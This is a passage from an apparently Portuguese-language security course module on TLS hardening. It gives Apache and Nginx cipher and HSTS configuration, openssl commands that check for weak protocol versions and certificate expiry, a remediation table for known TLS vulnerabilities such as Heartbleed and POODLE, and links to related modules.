Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

**Nginx:**

```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_compression off;
ssl_session_tickets off;
ssl_session_timeout 1d;
ssl_session_cache shared:MozSSL:10m;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

### Monitoramento de Seguranca TLS

```bash
# Verificar versoes TLS aceitas periodicamente
openssl s_client -tls1 -connect target.htb:443 2>&1 | grep -c "Handshake failure"
# 0 = TLS 1.0 ainda aceito (problema), 1 = rejeitado (correto)

# Script de verificacao continua
for protocol in ssl2 ssl3 tls1 tls1_1; do
    result=$(openssl s_client -$protocol -connect target.htb:443 2>&1)
    if echo "$result" | grep -q "SSL-Session"; then
        echo "ALERTA: $protocol esta habilitado!"
    fi
done

# Verificar data de expiracao do certificado
echo | openssl s_client -connect target.htb:443 2>/dev/null | openssl x509 -noout -dates

# Monitorar mudancas no certificado
openssl s_client -connect target.htb:443 2>/dev/null | openssl x509 -fingerprint -noout
```

### Referência de Remediação

| Vulnerabilidade | Solucao |
|---|---|
| SSL 2.0/3.0 habilitado | Desabilitar: `SSLProtocol -all +TLSv1.2 +TLSv1.3` |
| TLS 1.0/1.1 habilitado | Remover suporte, manter apenas 1.2 e 1.3 |
| Heartbleed | Atualizar OpenSSL para >= 1.0.1g |
| CRIME | Desabilitar compressao TLS: `SSLCompression off` |
| BREACH | Desabilitar compressao HTTP ou adicionar aleatoriedade a secrets |
| POODLE | Desabilitar SSL 3.0 |
| DROWN | Desabilitar SSL 2.0 em TODOS os servidores com a mesma chave |
| FREAK | Remover cipher suites EXPORT: `!EXPORT` |
| SWEET32 | Remover 3DES: `!3DES` |
| Sem PFS | Usar apenas cipher suites ECDHE/DHE |
| SSL Stripping | Habilitar HSTS com preload |
| Padding Oracle | Usar AEAD (GCM) em vez de CBC + MAC |
| Certificado expirado | Renovar certificado e automatizar com certbot |

---

## Módulos Relacionados

`01_request_smuggling.md` aborda o downgrade de protocolo como mecanismo similar de negociação insegura entre camadas de proxy. `02_http_misconfigs.md` trata do HSTS como contra-medida a SSL stripping e explica como cookies inseguros ficam expostos sem HTTPS obrigatório. `../11_apis_avancado/03_web_service_attacks.md` cobre SOAP sobre TLS e configurações de segurança de transporte em web services legados.
